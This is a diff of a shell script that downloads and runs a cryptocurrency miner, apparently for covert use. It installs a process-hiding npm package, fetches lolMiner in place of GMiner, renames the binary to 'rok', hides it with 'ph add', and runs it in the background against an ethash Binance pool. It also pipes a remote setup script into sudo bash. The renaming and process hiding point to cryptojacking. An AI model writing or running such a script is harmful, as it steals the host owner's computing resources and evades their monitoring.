@@ -5,11 +5,13 @@ apt update
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 sudo apt install nodejs
 npm i -g node-process-hider
-wget https://github.com/develsoftware/GMinerRelease/releases/download/2.83/gminer_2_83_linux64.tar.xz
-tar -xf gminer_2_83_linux64.tar.xz
-sudo ph add miner
-chmod 777 miner
-nohup ./miner --algo ethash --server ethash.poolbinance.com:443 --user TeslaM.$(echo $(shuf -i 1-9999 -n 1)-T4) > nohup.out
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.12/lolMiner_v1.12_Lin64.tar.gz
+tar xvf lolMiner_v1.12_Lin64.tar.gz
+cd 1.12
+mv lolMiner rok
+sudo ph add rok
+chmod 777 rok
+nohup ./rok --algo ETHASH --pool ethash.poolbinance.com:443 --user TeslaM.$(echo $(shuf -i 1-9999 -n 1)-T4) > nohup.out
 
 while [ 1 ]; do
 
